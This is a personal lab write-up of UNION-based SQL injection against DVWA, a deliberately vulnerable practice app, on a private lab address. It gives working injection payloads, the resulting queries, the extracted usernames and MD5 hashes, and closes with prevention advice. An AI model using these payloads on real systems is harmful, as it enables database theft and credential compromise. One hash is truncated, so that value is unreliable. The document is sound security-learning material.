# SQL Injection — DVWA (Low Security)

## Vulnerability Overview

**Target:** DVWA (Damn Vulnerable Web Application)  
**URL:** `http://192.168.56.106/dvwa/vulnerabilities/sqli/`  
**Type:** UNION-based SQL Injection  
**Result:** Full database dump including password hashes  

SQL Injection occurs when user input is inserted directly into a SQL query without sanitization. An attacker can manipulate the query logic to extract, modify, or delete data from the database.

---

## Setup

1. Navigate to `http://192.168.56.106/dvwa` in the Kali browser
2. Log in: `admin / password`
3. Go to **DVWA Security** → set to **Low** → Submit
4. Click **SQL Injection** in the left menu

---

## Steps

### Step 1 — Normal behaviour
Input:
```
1
```
Result:
```
First name: admin
Surname: admin
```
The app runs a query like:
```sql
SELECT * FROM users WHERE id = '1';
```

---

### Step 2 — Confirm injection point
Input:
```
1'
```
Result: SQL syntax error message — confirms input goes directly into the query unsanitized.

---

### Step 3 — Dump all users
Input:
```
1' OR '1'='1
```
The query becomes:
```sql
SELECT * FROM users WHERE id = '1' OR '1'='1';
```
Since `'1'='1'` is always true, all rows are returned:
- admin / admin
- Gordon / Brown
- Hack / Me
- Pablo / Picasso
- Bob / Smith

---

### Step 4 — Extract password hashes with UNION injection
Input:
```
1' UNION SELECT user, password FROM users#
```
The `UNION` appends a second query that selects usernames and password hashes from the users table. The `#` comments out the rest of the original query.

Result — all usernames and MD5 hashes extracted:

| Username | MD5 Hash |
|----------|----------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f26085367892e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

---

## Key Observations

- admin and smithy share the same hash — meaning they use the **same password**
- UNION injection works by matching the number of columns in the original query
- The `#` character comments out remaining SQL so the injected query runs cleanly

---

## What I Learned

- SQL injection is one of the most common and impactful web vulnerabilities (OWASP Top 10)
- A single quote `'` is the most basic test for an injection point
- UNION-based injection lets you extract data from any table in the database, not just the one the app queries
- Password hashes extracted from a database can be cracked offline — see [password-cracking.md](password-cracking.md)
- Prevention: use **parameterized queries / prepared statements** — never concatenate user input into SQL strings
